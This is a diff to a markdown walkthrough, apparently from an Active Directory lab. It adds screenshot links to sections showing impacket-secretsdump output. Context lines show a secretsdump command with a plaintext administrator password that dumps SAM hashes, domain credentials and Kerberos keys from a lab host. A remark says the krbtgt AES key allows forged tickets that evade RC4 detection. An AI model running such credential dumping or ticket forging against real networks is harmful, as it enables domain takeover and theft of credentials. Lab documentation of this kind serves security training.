@@ -22,14 +22,17 @@ See [`docs/protocols/kerberos.md`](../../docs/protocols/kerberos.md)
 ```bash
 impacket-secretsdump bob.local/administrator:'MAMA1papa2@22'@192.168.10.7
 ```
+![secretsdump output — SAM hashes](../../screenshots/06-domain-dominance/01-secretsdump-sam.png)
 
 ### 2. Key output — local SAM hashes
 These are the local machine accounts (not domain-wide).
 
 ### 3. Key output — domain credentials via DRSUAPI
 
-### 4. Key output — Kerberos keys
+![secretsdump output — domain credentials including krbtgt](../../screenshots/06-domain-dominance/02-secretsdump-domain.png)
 
+### 4. Key output — Kerberos keys
+![secretsdump output — Kerberos AES keys](../../screenshots/06-domain-dominance/03-secretsdump-kerberos-keys.png)
 The AES256 key for krbtgt enables forging tickets
 that bypass RC4 detection rules.
 
